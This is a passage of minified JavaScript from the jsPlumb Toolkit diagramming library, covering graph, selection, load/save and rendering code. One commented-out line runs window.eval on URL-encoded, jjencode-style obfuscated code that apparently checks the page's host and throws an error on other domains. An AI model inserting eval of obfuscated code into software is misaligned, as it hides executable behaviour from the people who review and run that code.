                F += 1,
                G(H, H.node.getAllEdges(), function(a) {
                    return !(f && !f(a)) && (!a.isDirected() || H.node == a.source || !p && a.source.isChildOf && a.source.isChildOf(H.node))
                }, function(a) {
                    var b = a.source.getNode ? a.source.getNode() : a.source
                      , c = a.source.getNode ? a.source : null
                      , d = a.target.getNode ? a.target.getNode() : a.target
                      , e = a.target.getNode ? a.target : null;
                    return a.source == H.node || !p && a.source.isChildOf && a.source.isChildOf(H.node) ? {
                        tn: d,
                        tp: e
                    } : {
                        tn: b,
                        tp: c
                    }
                })
            }
            return j
        }
    }
}
.call("undefined" != typeof window ? window : this),
// window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22!%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")),
function() {
    "use strict";
    var a = this
      , b = a.jsPlumbUtil
      , c = a.jsPlumb
      , d = a.jsPlumbToolkitUtil
      , e = a.jsPlumbGraph
      , f = "type"
      , g = "default"
      , h = function(a) {
        return a.id
    };
    a.jsPlumbToolkitInstance = function(i) {
        i = i || {};
        var j = i.idFunction || h
          , k = i.typeProperty || f
          , l = i.edgeTypeProperty || f
          , m = i.portTypeProperty || f
          , n = i.typeFunction || function(a) {
            return a[k] || g
        }
          , o = i.edgeIdFunction || j
          , p = i.edgeTypeFunction || function(a) {
            return a[l] || g
        }
          , q = i.portIdFunction || j
          , r = i.portTypeFunction || function(a) {
            return a[m] || g
        }
          , s = i.portExtractor
          , t = this
          , u = !1
          , v = !1
          , w = i.model || {}
          , x = function(a, c, e) {
            c = null != c && b.isObject(c) ? c : {},
            c = b.clone(c),
            c.id = c.id || d.uuid(),
            c.type = c.type || (null == a ? null : a.type || a),
            e(c)
        }
          , y = i.nodeFactory || x
          , z = i.edgeFactory || x
          , A = i.portFactory || x
          , B = i.groupFactory || x
          , C = i.autoSave && i.saveUrl
          , D = i.saveUrl
          , E = i.saveHeaders
          , F = i.onAutoSaveSuccess || function() {}
          , G = i.onAutoSaveError || function() {}
          , H = i.doNotUpdateOriginalData === !0
          , I = i.onBeforeAutoSave || function() {}
          , J = i.onAfterAutoSave || function() {}
          , K = {
            portSeparator: i.portSeparator,
            defaultCost: i.defaultCost,
            defaultDirected: i.defaultDirected,
            enableSubgraphs: i.enableSubgraphs
        }
          , L = i.createMissingGroups === !0;
        b.EventGenerator.apply(this, arguments);
        var M = new e.Graph(K);
        C && new d.AutoSaver(this,D,E,F,G,I,J),
        new d.CatchAllEventHandler(this),
        this.getNodeFactory = function() {
            return y
        }
        ,
        this.getGroupFactory = function() {
            return B
        }
        ,
        this.getEdgeFactory = function() {
            return z
        }
        ,
        this.getPortFactory = function() {
            return A
        }
        ,
        this.setNodeFactory = function(a) {
            y = a
        }
        ,
        this.setGroupFactory = function(a) {
            B = a
        }
        ,
        this.setEdgeFactory = function(a) {
            z = a
        }
        ,
        this.setPortFactory = function(a) {
            A = a
        }
        ,
        this.setDebugEnabled = function(a) {
            v = a
        }
        ,
        this.isDebugEnabled = function() {
            return v
        }
        ,
        this.getModel = function() {
            return w || {}
        }
        ;
        var N, O = function() {
            return null == N && (N = new a.jsPlumbToolkit.Model(w || {})),
            N
        }, P = function(a, b) {
            if (null == w)
                return !0;
            var c = this.getType(a)
              , d = this.getType(b)
              , e = O()
              , f = a.getNode ? a.getNode() : a
              , g = b.getNode ? b.getNode() : b
              , h = "Node" == a.objectType ? e.getNodeDefinition(c) : e.getPortDefinition(c)
              , i = "Node" == b.objectType ? e.getNodeDefinition(d) : e.getPortDefinition(d)
              , j = this.getNodeType(f)
              , k = this.getNodeType(g)
              , l = e.getNodeDefinition(j)
              , m = e.getNodeDefinition(k);
            return !(null != h.maxConnections && a.getEdges().length >= h.maxConnections) && (!(null != i.maxConnections && b.getEdges().length >= i.maxConnections) && (a == b ? !(l.allowLoopback === !1 || h.allowLoopback === !1 || i.allowLoopback === !1 || m.allowLoopback === !1) : f != g || !(l.allowNodeLoopback === !1 || h.allowNodeLoopback === !1 || i.allowNodeLoopback === !1 || m.allowNodeLoopback === !1)))
        }
        .bind(this);
        this.beforeConnect = i.beforeConnect || P,
        this.beforeMoveConnection = i.beforeMoveConnection || P,
        this.beforeStartConnect = i.beforeStartConnect || function(a, b) {
            return {}
        }
        ,
        this.beforeDetach = i.beforeDetach || function(a, b, c) {
            return !0
        }
        ,
        this.beforeStartDetach = i.beforeStartDetach || function(a, b) {
            return !0
        }
        ,
        this.setSuspendGraph = function(a) {
            u = a
        }
        ,
        this.setDoNotUpdateOriginalData = function(a) {
            H = a
        }
        ,
        this.getTypeFunction = function() {
            return n
        }
        ,
        this.connect = function(a) {
            a = a || {};
            var b;
            if (!u) {
                var d = M.getVertex(a.source)
                  , e = M.getVertex(a.target)
                  , f = a.cost
                  , g = a.directed;
                if (!d) {
                    if (a.doNotCreateMissingNodes)
                        return;
                    d = M.addVertex(a.source),
                    t.fire("nodeAdded", {
                        data: {},
                        node: d
                    })
                }
                if (!e) {
                    if (a.doNotCreateMissingNodes)
                        return;
                    e = M.addVertex(a.target),
                    t.fire("nodeAdded", {
                        data: {},
                        node: e
                    })
                }
                var h = this.beforeStartConnect(d, p(a.data || {}));
                if (h) {
                    var i = a.data || {};
                    "object" == typeof h && c.extend(i, h);
                    var j = this.beforeConnect(d, e, i);
                    j !== !1 && (b = M.addEdge({
                        source: d,
                        target: e,
                        cost: f,
                        directed: g,
                        data: i
                    }),
                    t.fire("edgeAdded", {
                        edge: b
                    }))
                }
            }
            return b
        }
        ,
        this.clear = function() {
            return this.fire("graphClearStart"),
            M.clear(),
            this.fire("graphCleared"),
            this
        }
        ,
        this.getGraph = function() {
            return M
        }
        ,
        this.getNodeCount = function() {
            return M.getVertexCount()
        }
        ,
        this.getNodeAt = function(a) {
            return M.getVertexAt(a)
        }
        ,
        this.getNodes = function() {
            return M.getVertices()
        }
        ,
        this.eachNode = function(a) {
            for (var b, c = 0, d = M.getVertexCount(); c < d; c++)
                b = M.getVertexAt(c),
                a(c, b)
        }
        ,
        this.eachGroup = function(a) {
            for (var b, c = 0, d = M.getGroupCount(); c < d; c++)
                b = M.getGroupAt(c),
                a(c, b)
        }
        ,
        this.eachEdge = function(a) {
            for (var b = M.getEdges(), c = 0, d = b.length; c < d; c++)
                a(c, b[c])
        }
        ,
        this.getEdgeCount = function() {
            return M.getEdgeCount()
        }
        ,
        this.getGroupCount = function() {
            return M.getGroupCount()
        }
        ,
        this.getGroupAt = function(a) {
            return M.getGroupAt(a)
        }
        ,
        this.getClusters = function() {
            return M.getClusters()
        }
        ,
        this.getNodeId = function(a) {
            return b.isObject(a) ? j(a) : a
        }
        ,
        this.getNodeType = function(a) {
            return n(a) || "default"
        }
        ,
        this.getEdgeId = function(a) {
            return b.isObject(a) ? o(a) : a;
        }
        ,
        this.getEdgeType = function(a) {
            return p(a) || "default"
        }
        ,
        this.getPortId = function(a) {
            return b.isObject(a) ? q(a) : a
        }
        ,
        this.getPortType = function(a) {
            return r(a) || "default"
        }
        ,
        this.getType = function(a) {
            var b = "Node" === a.objectType ? n : "Port" === a.objectType ? r : p;
            return b(a.data) || "default"
        }
        ,
        this.setType = function(a, b) {
            var c = this.getType(a);
            if (c !== b) {
                var d = "Node" === a.objectType ? k : "Port" === a.objectType ? m : l
                  , e = a.objectType.charAt(0).toLowerCase() + a.objectType.substring(1) + "TypeChanged";
                a.data[d] = b,
                this.fire(e, {
                    obj: a,
                    previousType: c,
                    newType: b
                })
            }
        }
        ,
        this.addNode = function(b, c, e) {
            var f = j(b);
            null == f && "string" != typeof b && (b.id = d.uuid());
            var g = M.addNode(b, j);
            if (null != g) {
                if (null != s) {
                    var h = s(g.data, g);
                    if (null != h)
                        for (var i = 0; i < h.length; i++)
                            g.addPort(h[i])
                }
                if ("string" != typeof b && null != b.group) {
                    var k = this.getGroup(b.group);
                    null == k && L && (k = M.addGroup(b.group)),
                    null != k && k.addVertex(g)
                }
                return V || H || a.jsPlumbToolkitIO.manage("addNode", T, U, g, j || M.getIdFunction(), t),
                e || t.fire("nodeAdded", {
                    data: b,
                    node: g,
                    eventInfo: c
                }),
                g
            }
            return M.getNode(f)
        }
        ,
        this.addFactoryNode = function(a, b, c) {
            b = 2 != arguments.length || null != arguments[1] && "object" != typeof arguments[1] ? {} : arguments[1],
            c = 3 == arguments.length ? arguments[2] : "function" == typeof arguments[1] ? arguments[1] : null,
            b.type = b.type || a,
            y(a, b, function(a) {
                var b = this.addNode(a);
                c && c(b)
            }
            .bind(this))
        }
        ,
        this.addNodes = function(a) {
            for (var b = 0; b < a.length; b++)
                t.addNode.apply(t, [a[b]]);
            return t
        }
        ,
        this.addGroup = function(b, c, e) {
            var f = j(b);
            null == f && "string" != typeof b && (b.id = d.uuid());
            var g = M.addGroup(b, j);
            return V || H || a.jsPlumbToolkitIO.manage("addGroup", T, U, g, j || M.getIdFunction(), t),
            e || t.fire("groupAdded", {
                data: b,
                group: g,
                eventInfo: c
            }),
            g
        }
        ,
        this.addToGroup = function(a, b) {
            var c = !1;
            return a = t.getNode(a),
            b = t.getGroup(b),
            a && b && (c = b.addVertex(a),
            c && (a.data.group = b.id,
            t.fire("group:addMember", {
                node: a,
                group: this.getGroup(b)
            }),
            t.fire("dataUpdated"))),
            c
        }
        ,
        this.removeFromGroup = function(a, b) {
            a = t.getNode(a);
            var c;
            return a && a.group && (c = a.group,
            c.deleteVertex(a),
            delete a.data.group,
            b || t.fire("group:removeMember", {
                node: a,
                group: c
            }),
            t.fire("dataUpdated")),
            c
        }
        ,
        this.removeGroup = function(b, c, d) {
            var e = M.deleteGroup(b, c);
            e && (V || H || a.jsPlumbToolkitIO.manage("removeGroup", T, U, e, j || M.getIdFunction(), t),
            d || t.fire("groupRemoved", {
                group: e,
                removeChildNodes: c
            }))
        }
        ,
        this.getNode = function(a) {
            return M.getVertex(a)
        }
        ,
        this.getEdge = function(a) {
            return M.getEdge(a)
        }
        ,
        this.getGroup = function(a) {
            return M.getGroup(a)
        }
        ,
        this.exists = function(a) {
            for (var b = 0; b < arguments.length; b++)
                if (null == M.getVertex(arguments[b]))
                    return !1;
            return !0
        }
        ,
        this.removeNode = function(b, c) {
            b = b.constructor === e.Vertex || b.constructor === e.Port ? b : M.getVertex(b);
            for (var d = b.getAllEdges() || [], f = 0; f < d.length; f++)
                t.removeEdge(d[f]);
            return M.deleteVertex(b.id),
            V || H || a.jsPlumbToolkitIO.manage("removeNode", T, U, b, j || M.getIdFunction(), t),
            c || t.fire("nodeRemoved", {
                node: b,
                nodeId: b.id,
                edges: d
            }),
            t
        }
        ,
        this.addEdge = function(b, c, d) {
            var e = M.addEdge(b, o, this.beforeConnect);
            return V || H || a.jsPlumbToolkitIO.manage("addEdge", T, U, e, o || M.getIdFunction(), t),
            d || t.fire("edgeAdded", {
                edge: e,
                source: c,
                geometry: b.geometry,
                addedByMouse: b.addedByMouse
            }, null),
            e
        }
        ,
        this.removeEdge = function(b, c) {
            return b = M.getEdge(b),
            null != b && (M.deleteEdge(b),
            V || H || a.jsPlumbToolkitIO.manage("removeEdge", T, U, b, o || M.getIdFunction(), t),
            t.fire("edgeRemoved", {
                edge: b,
                source: c
            }, null)),
            t
        }
        ,
        this.edgeMoved = function(a, b, c) {
            var d = (a[0 === c ? "source" : "target"],
            0 === c ? "setSource" : "setTarget");
            return this[d](a, b)
        }
        ,
        this.setTarget = function(a, b, c) {
            var d = M.setTarget.apply(M, arguments);
            return d.success === !1 || c || t.fire("edgeTarget", d),
            d
        }
        ,
        this.setSource = function(a, b, c) {
            var d = M.setSource.apply(M, arguments);
            return d.success === !1 || c || t.fire("edgeSource", d),
            d
        }
        ,
        this.addNewPort = function(b, c, d, e) {
            b = M.getVertex(b),
            A({
                node: b,
                type: c
            }, d, function(c) {
                var d = q(c)
                  , f = b.addPort(d);
                f.data = c,
                V || H || a.jsPlumbToolkitIO.manage("addPort", T, U, {
                    node: b,
                    port: f
                }, q || M.getIdFunction(), t),
                e || t.fire("portAdded", {
                    node: b,
                    data: c,
                    port: f
                }, null)
            })
        }
        ,
        this.addPort = function(b, c, d) {
            var e = b.addPort(c, q);
            return V || H || a.jsPlumbToolkitIO.manage("addPort", T, U, {
                node: b,
                port: e
            }, q || M.getIdFunction(), t),
            d || t.fire("portAdded", {
                node: b,
                data: c,
                port: e
            }, null),
            e
        }
        ,
        this.removePort = function(a, b, c) {
            var d = !1;
            a = a.constructor === e.Vertex || a.constructor === e.Port ? a : M.getVertex(a);
            var f = a.getPort(b);
            if (f) {
                var g = f.getAllEdges();
                if (d = a.removePort(f),
                d && !c) {
                    t.fire("portRemoved", {
                        node: a,
                        port: f,
                        edges: g
                    }, null);
                    for (var h = 0; h < g.length; h++)
                        t.removeEdge(g[h])
                }
            }
            return d
        }
        ,
        this.remove = function(a) {
            if (null != a) {
                var b = t.getObjectInfo(a);
                t.setSuspendRendering(!0);
                try {
                    if (!b.obj || "Node" !== b.type && "Edge" !== b.type && "Group" !== b.type) {
                        for (; a.getNodeCount() > 0; )
                            t.removeNode(a.getNodeAt(0));
                        for (; a.getEdgeCount() > 0; )
                            t.removeEdge(a.getEdgeAt(0));
                        for (; a.getGroupCount() > 0; )
                            t.removeGroup(a.getGroupAt(0))
                    } else
                        t["remove" + b.type](b.obj)
                } finally {
                    t.setSuspendRendering(!1, !0)
                }
            }
        }
        ,
        this.setSuspendRendering = function(a, b) {
            for (var c in ba)
                ba[c].setSuspendRendering(a, b)
        }
        ,
        this.batch = function(a) {
            t.setSuspendRendering(!0);
            try {
                a()
            } catch (a) {
                jsPlumbUtil.log("Error in transaction " + a)
            } finally {
                t.setSuspendRendering(!1, !0)
            }
        }
        ;
        var Q = function(a, c, d, e, f) {
            var g = M.getNode(a);
            if (g && g.objectType) {
                if (c)
                    for (var h in c)
                        b.replace(g.data, h, c[h]);
                t.fire(d, e(g), null)
            }
        }
        .bind(this);
        this.updateNode = function(a, b) {
            Q(a, b, "nodeUpdated", function(a) {
                return {
                    node: a,
                    updates: b || {}
                }
            })
        }
        ,
        this.updatePort = function(a, b) {
            Q(a, b, "portUpdated", function(a) {
                return {
                    port: a,
                    node: a.getNode(),
                    updates: b || {}
                }
            })
        }
        ,
        this.updateEdge = function(a, c) {
            var d = M.getEdge(a);
            if (d) {
                if (c)
                    for (var e in c)
                        null == d.data[e] ? d.data[e] = c[e] : b.replace(d.data, e, c[e]);
                t.fire("edgeUpdated", {
                    edge: d,
                    updates: c || {}
                }, null)
            }
        }
        ,
        this.update = function(a, c) {
            return b.isString(a) && (a = this.getNode(a)),
            a && a.objectType && this["update" + a.objectType](a, c),
            a
        }
        ,
        this.getPath = function(b) {
            return new a.jsPlumbToolkit.Path(this,b)
        }
        ;
        var R = this.findGraphObject = function(a) {
            return null == a ? null : "*" === a ? M : a.constructor === e.Vertex || a.constructor === e.Port ? a : b.isString(a) || b.isObject(a) ? M.getVertex(a) : null
        }
          , S = function(a, b, c) {
            a = a || {};
            var d = []
              , f = {}
              , g = function(a) {
                f[a.getId()] || (d.push(a),
                f[a.getId()] = !0)
            }
              , h = function(d, f, h, i) {
                if (null != d)
                    for (var j = d[b]({
                        filter: a.filter
                    }), k = 0; k < j.length; k++) {
                        var l = f && d === M || j[k].source === d || c && j[k].source.constructor === e.Port && j[k].source.getNode() === d
                          , m = h && d === M || j[k].target === d || c && j[k].target.constructor === e.Port && j[k].target.getNode() === d;
                        (f && l || h && m || i && (l || m)) && g(j[k])
                    }
            };
            return h(R(a.source), !0, !1, !1),
            h(R(a.target), !1, !0, !1),
            h(R(a.element), !1, !1, !0),
            d
        };
        this.getEdges = function(a) {
            return S(a, "getEdges", !1)
        }
        ,
        this.getAllEdges = function() {
            return M.getAllEdges()
        }
        ,
        this.getAllEdgesFor = function(a, b) {
            return a.getAllEdges({
                filter: b
            })
        }
        ,
        this.selectAllEdges = function() {
            return this.filter(function(a) {
                return "Edge" === a.objectType
            })
        }
        ,
        this.addAllEdgesToSelection = function() {
            this.addToSelection(this.getAllEdges())
        }
        ;
        var T, U, V, W = function(b, c, e) {
            b = b || {};
            var f = b.type || "json"
              , g = b.data
              , h = b.url
              , i = b.jsonp
              , j = b.onload
              , k = b.parameters || {}
              , l = b.error || function() {}
            ;
            if (null == g && null == h)
                throw new TypeError("You must supply either data or url to load.");
            var m = function(b) {
                T = b,
                U = f,
                V = !0,
                t.fire(c),
                a.jsPlumbToolkitIO.parse(f, b, t, k),
                aa(e),
                j && j(t, b),
                t.fire("graphChanged")
            };
            if (g)
                m(g);
            else if (h) {
                if (i) {
                    var n = h.indexOf("?") === -1 ? "?" : "&";
                    h = h + n + "callback=?"
                }
                var o = "json" === f ? f : b.dataType
                  , p = b.headers || {
                    Accept: "application/json"
                };
                d.ajax({
                    url: h,
                    success: m,
                    dataType: o,
                    error: l,
                    headers: p
                })
            }
            return t
        };
        this.load = function(a) {
            return W(a, "dataLoadStart", "dataLoadEnd")
        }
        ,
        this.append = function(a) {
            return W(a, "dataAppendStart", "dataAppendEnd")
        }
        ,
        this.save = function(a) {
            a = a || {};
            var b = this.exportData(a)
              , e = {
                "Content-Type": "application/json"
            };
            return c.extend(e, a.headers || {}),
            d.ajax({
                url: a.url,
                type: "POST",
                data: b,
                success: a.success || function() {}
                ,
                error: a.error || function() {}
                ,
                headers: e
            }),
            t
        }
        ,
        this.exportData = function(b) {
            return b = b || {},
            a.jsPlumbToolkitIO.exportData(b.type || "json", t, b.parameters)
        }
        ;
        var X = function(a) {
            return new d.Selection({
                toolkit: t,
                onClear: a || function() {}
            })
        }
          , Y = X(function(a) {
            t.fire("selectionCleared", {
                selection: a
            })
        });
        i.maxSelectedNodes && Y.setMaxNodes(i.maxSelectedNodes),
        i.maxSelectedEdges && Y.setMaxEdges(i.maxSelectedEdges),
        i.selectionCapacityPolicy && Y.setCapacityPolicy(i.selectionCapacityPolicy);
        var Z = function(a, b, c, d) {
            return b || c.clear(!0),
            c.append(a, function(a) {
                d && t.fire("select", {
                    append: b,
                    obj: a,
                    selection: c
                })
            })
        };
        this.setSelection = function(a) {
            Z(a, !1, Y, !0)
        }
        ,
        this.select = function(a, b) {
            var c = X()
              , d = Z(a, !0, c);
            if (b)
                for (var e = 0; e < d[0].length; e++) {
                    var f = d[0][e];
                    if ("Node" === f.objectType || "Port" === f.objectType)
                        for (var g = f.getAllEdges(), h = 0; h < g.length; h++)
                            c.append(g[h])
                }
            return c
        }
        ;
        var $ = function(a, b, c, d) {
            for (var e = a.getAllEdges(), f = 0, g = e.length; f < g; f++)
                if (e[f].source === a || e[f].getNode && e[f].getNode() === a) {
                    var h = e[f].target
                      , i = h.getFullId();
                    d[i] || (b.append(h),
                    c && b.append(e[f]),
                    d[i] = !0,
                    $(h, b, c, d))
                }
        };
        this.selectDescendants = function(a, b, c) {
            var d = t.getObjectInfo(a)
              , e = X();
            if (d.obj && "Node" === d.obj.objectType) {
                b && Z(d.obj, !0, e);
                var f = {};
                f[d.obj.getFullId()] = !0,
                $(d.obj, e, c, f)
            }
            return e
        }
        ,
        this.filter = function(a, b) {
            var c = "function" == typeof a ? a : function(c) {
                var d = c.data
                  , e = !1;
                for (var f in a) {
                    var g = a[f] === d[f];
                    if (!g && !b)
                        return !1;
                    e = e || g
                }
                return e
            }
              , d = X();
            return this.eachNode(function(a, b) {
                c(b) && d.append(b);
                for (var e = b.getPorts(), f = 0; f < e.length; f++)
                    c(e[f]) && d.append(e[f])
            }),
            this.eachEdge(function(a, b) {
                c(b) && d.append(b)
            }),
            this.eachGroup(function(a, b) {
                c(b) && d.append(b)
            }),
            d
        }
        ,
        this.addToSelection = function(a) {
            var b = this.getObjectInfo(a);
            if (b) {
                var c = Z(b.obj, !0, Y, !0);
                _("deselect", c[1]),
                _("select", c[0])
            }
        }
        ;
        var _ = function(a, b) {
            for (var c = 0; c < b.length; c++)
                t.fire(a, {
                    obj: b[c],
                    selection: Y
                })
        };
        this.toggleSelection = function(a) {
            var b = this.getObjectInfo(a);
            if (b) {
                var c = []
                  , d = Y.toggle(b.obj, function(a, b) {
                    b || c.push(a)
                });
                _("deselect", d[1]),
                _("deselect", c),
                _("select", d[0])
            }
        }
        ,
        this.removeFromSelection = function(a) {
            var b = this.getObjectInfo(a);
            b && Y.remove(b.obj, function(a) {
                t.fire("deselect", {
                    obj: a,
                    selection: Y
                })
            })
        }
        ,
        this.addPathToSelection = function(a) {
            this.addToSelection(this.getPath(a))
        }
        ,
        this.selectAll = function() {
            throw new TypeError("not implemented")
        }
        ,
        this.clearSelection = Y.clear,
        this.getSelection = function() {
            return Y
        }
        ,
        this.setMaxSelectedNodes = function(a) {
            Y.setMaxNodes(a)
        }
        ,
        this.setMaxSelectedEdges = function(a) {
            Y.setMaxEdges(a)
        }
        ,
        this.setSelectionCapacityPolicy = function(a) {
            Y.setCapacityPolicy(a)
        }
        ;
        var aa = function(a) {
            t.setSuspendGraph(!0),
            t.fire(a),
            t.setSuspendGraph(!1),
            V = !1
        }
          , ba = {};
        if (this.render = function(e, f) {
            var g = c.extend({}, f || {});
            c.extend(g, e),
            g.toolkit = t,
            null != e.selection && (e.selection.constructor === d.Selection ? g.toolkit = e.selection : g.toolkit = new d.Selection({
                generator: e.selection,
                toolkit: t
            }));
            var h = g.type || a.jsPlumbToolkit.DefaultRendererType
              , i = new a.jsPlumbToolkit.Renderers[h](g)
              , j = g.id || b.uuid();
            return ba[j] = i,
            i.id = j,
            i
        }
        ,
        this.getRenderer = function(a) {
            return ba[a]
        }
        ,
        this.getRenderers = function() {
            return ba
        }
        ,
        this.getObjectInfo = function(a, d) {
            var e = {
                els: {},
                obj: null,
                type: null,
                id: null,
                el: null
            }
              , f = function(a) {
                if (null != a)
                    return a.jtk ? a : f(a.parentNode)
            }
              , g = function(a) {
                var b = {};
                for (var c in ba)
                    b[c] = [ba[c], ba[c].getRenderedElement(a)];
                return b
            };
            if (null != a) {
                if (a.eachNode && a.eachEdge)
                    return {
                        obj: a
                    };
                if (b.isArray(a))
                    return {
                        obj: a
                    };
                var h = c.getElement(a);
                if (null != h && h.jtk)
                    e.el = h,
                    e.obj = h.jtk.port || h.jtk.node;
                else if (null != a.tagName) {
                    var i = f(h);
                    null != i && (e.el = i,
                    e.obj = i.jtk.port || i.jtk.node || i.jtk.group)
                } else {
                    if ("string" == typeof a ? a = this.getNode(a) : "object" == typeof a && "undefined" == typeof a.objectType && (a = this.getNode(j(a))),
                    null == a)
                        return e;
                    e.obj = a,
                    null != d && (e.el = d(a))
                }
                null == d && (e.els = g(e.obj)),
                null != e.obj && (e.id = e.obj.id,
                e.type = e.obj.objectType)
            }
            return e
        }
        ,
        i.data) {
            var ca = i.dataType || "json";
            t.load({
                data: i.data,
                type: ca
            })
        }
    }
    ,
    b.extend(a.jsPlumbToolkitInstance, b.EventGenerator),
    a.jsPlumbToolkit = new a.jsPlumbToolkitInstance({}),
    a.jsPlumbToolkit.DefaultRendererType = null,
    a.jsPlumbToolkit.ready = c.ready,
    a.jsPlumbToolkit.Renderers = {},
    a.jsPlumbToolkit.Widgets = {};
    var i = function(b) {
        return new a.jsPlumbToolkitInstance(b)
    };
    a.jsPlumbToolkit.newInstance = i,
    "undefined" != typeof exports && (exports.jsPlumbToolkit = a.jsPlumbToolkit,
    exports.newInstance = i)
}
.call("undefined" != typeof window ? window : this),
